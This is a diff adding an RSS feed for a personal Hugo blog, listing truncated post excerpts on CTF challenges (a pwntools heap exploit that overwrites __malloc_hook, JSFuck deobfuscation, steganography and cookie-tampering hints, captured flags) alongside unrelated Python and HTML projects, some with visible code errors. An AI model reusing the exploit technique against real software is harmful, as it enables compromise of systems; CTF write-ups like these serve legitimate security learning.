@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>My New Hugo Site</title>
+    <link>/</link>
+    <description>Recent content on My New Hugo Site</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title></title>
+      <link>/advanced/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/advanced/</guid>
+      <description>Automate Google Form Using Python. 🎉
+Steps-
+ Create a (.csv) file of all the possible answers. Inspect the necessary web elements by the type of inputs. Enter the form URl in the code. Access the web address with all your credentials. Send keys for the text based input. Locate your (.csv) or (.zip) file. Looping over data for multiple answers.  from msilib.schema import CheckBox from turtle import pd from selenium import webdriver import pandasas as pd import time import json from datetime import datetime import pathlib import glob import os import sys import faker import numpy as np sys.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/cyber/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/cyber/</guid>
+      <description>#!/usr/bin/env python3 from pwn import * elf = context.binary = ELF(&#39;./force&#39;) libc = ELF(&#39;./.glibc/glibc_2.28_no-tcache/libc-2.28.so&#39;) # io = gdb.debug([elf.path]) io = remote(&#39;0.cloud.chals.io&#39;, 11996) io.readline() system = int(io.readline().strip().split(b&#39; &#39;)[-1], 16) log.success(f&#39;Leaked system: {hex(system)}&#39;) libc.address = system - libc.symbols.system log.success(f&#39;Libc base: {hex(system)}&#39;) heap = int(io.readline().strip().split(b&#39; &#39;)[-1], 16) log.success(f&#39;Leaked heap: {hex(heap)}&#39;) def get_chunk(size, data): io.sendline(b&#39;1&#39;) io.sendline(str(size).encode()) io.sendline(data) get_chunk(0x10, b&#39;A&#39;*0x18+pack(-1)) top_chunk_addr = heap + 0x20 request_size = libc.symbols.__malloc_hook - top_chunk_addr - 2 * 8 - 8 get_chunk(request_size, &#39;&#39;) get_chunk(0x10, pack(system)) get_chunk(next(libc.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/flag/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/flag/</guid>
+      <description>ictf{4n_34zy_0s1nt_ch4ll}</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/imaginary/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/imaginary/</guid>
+      <description>May luck with you Btw check /404.html</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/knight-ctf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/knight-ctf/</guid>
+      <description>Obsfuscation Isn&amp;rsquo;t Enough
+In the site there is a script, in it there is a weird function validate(){...} We then noticed it was similer to brainfuck so we tried a brainfuck decoder and saw its not brainfuck, then we thought it looked like JSFuck so we tried to decode it with a JSFuck decoder (https://codertab.com/jsunfuck) and we saw it is just: if (document.forms[0].username.value == &amp;quot;83fe2a837a4d4eec61bd47368d86afd6&amp;quot; &amp;amp;&amp;amp; document.forms[0].password.value == &amp;quot;a3fa67479e47116a4d6439120400b057&amp;quot;) document.location = &amp;quot;150484514b6eeb1d99da836d95f6671d.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/post/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/post/</guid>
+      <description>InCTFj WEB
+ RoBoCorp - - In this challenge you have to just type robotx.txt and there will be on html file go and change it. This will give you the flag. Favourite cookie : -In this challenge ,you will have to go to network tab and there you can see hint : oreo after that go to application in inspect element change the value of fav cookie to oreo now refresh the page you will get time : 20:30 now go to application and change the value of time to 20:30.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/python/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/python/</guid>
+      <description>import sys from PyQt5.QtCore import * from PyQt5.QtWidgets import * from PyQt5.QtWebEngineWidgets import * class MainWindow(QMainWindow): def __init__(self): super(MainWindow,self).__init__() self.browser=QWebEngineView() self.browser.setUrl(QUrl(&amp;quot;http://www.bing.com&amp;quot;)) self.setCentralWidget(self.browser) self.showMaximised() navbar=QToolBar() self.addToolBar(navbar) back_button=QAction(&#39;back&#39;,self) back_button.triggered.connect(self.browser.back) back_button.addAction(back_button) forward_button=QAction(&#39;forward&#39;,self) forward_button.triggered.connect(self.browser.foreward) forward_button.addAction(forward_button) reload_button=QAction(&#39;reload&#39;,self) reload_button.triggered.connect(self.browser.reload) reload_button.addAction(reload_button) home_button=QAction(&#39;home&#39;,self) home_button.triggered.connect(self.browser.home) home_button.addAction(home_button) self.url_bar=QLineEdit() self.url_bar.returnPressed.connect(self.navigate_to_url) navbar.addWidget(self.url_bar) self.browser.urlChanged.connect(self.update_url) def navigate_to_home(self): self.browser.setUrl(QUrl(&amp;quot;http://www.google.com&amp;quot;)) def navigate_to_url(self): url=self.url_bar.text() self.browser.setUrl(QUrl(url)) def update_url(self,q): self.url_bar.setText(q.toString()) app=QApplication(sys.argv) QApplication.setApplicationName(&#39;Home Made Browser By (Aayush Kumar)&#39;) window=MainWindow() app.exec_() </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/shell-ctf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/shell-ctf/</guid>
+      <description>FORENSICS  GO DEEP  So basically for GO DEEP we have to use DEEPSOUND &amp;amp; we have to use exif tool to get the password which was shell. And , we&#39;ll get the flag. FLAG - SHELL{y0u_w3r3_7h1nk1ng_R3ally_D33p} Hidden FILE  So basically we get a jpg file , I have used aperisolve to analise the file and I got the password as shell. Then we have to use steghide as steghide extract -sf Hidden.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/visa-card/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/visa-card/</guid>
+      <description>HTML :-
+&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=edge&amp;quot;&amp;gt; &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt; &amp;lt;!-- custom css file link --&amp;gt; &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/style.css&amp;quot;&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt; &amp;lt;div class=&amp;quot;card-container&amp;quot;&amp;gt; &amp;lt;div class=&amp;quot;front&amp;quot;&amp;gt; &amp;lt;div class=&amp;quot;image&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;image/chip.png&amp;quot; alt=&amp;quot;&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;image/visa.png&amp;quot; alt=&amp;quot;&amp;quot;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&amp;quot;card-number-box&amp;quot;&amp;gt;################&amp;lt;/div&amp;gt; &amp;lt;div class=&amp;quot;flexbox&amp;quot;&amp;gt; &amp;lt;div class=&amp;quot;box&amp;quot;&amp;gt; &amp;lt;span&amp;gt;card holder&amp;lt;/span&amp;gt; &amp;lt;div class=&amp;quot;card-holder-name&amp;quot;&amp;gt;full name&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&amp;quot;box&amp;quot;&amp;gt; &amp;lt;span&amp;gt;expires&amp;lt;/span&amp;gt; &amp;lt;div class=&amp;quot;expiration&amp;quot;&amp;gt; &amp;lt;span class=&amp;quot;exp-month&amp;quot;&amp;gt;mm&amp;lt;/span&amp;gt; &amp;lt;span class=&amp;quot;exp-year&amp;quot;&amp;gt;yy&amp;lt;/span&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&amp;quot;back&amp;quot;&amp;gt; &amp;lt;div class=&amp;quot;stripe&amp;quot;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;div class=&amp;quot;box&amp;quot;&amp;gt; &amp;lt;span&amp;gt;cvv&amp;lt;/span&amp;gt; &amp;lt;div class=&amp;quot;cvv-box&amp;quot;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;img src=&amp;quot;image/visa.</description>
+    </item>
+    
+  </channel>
+</rss>
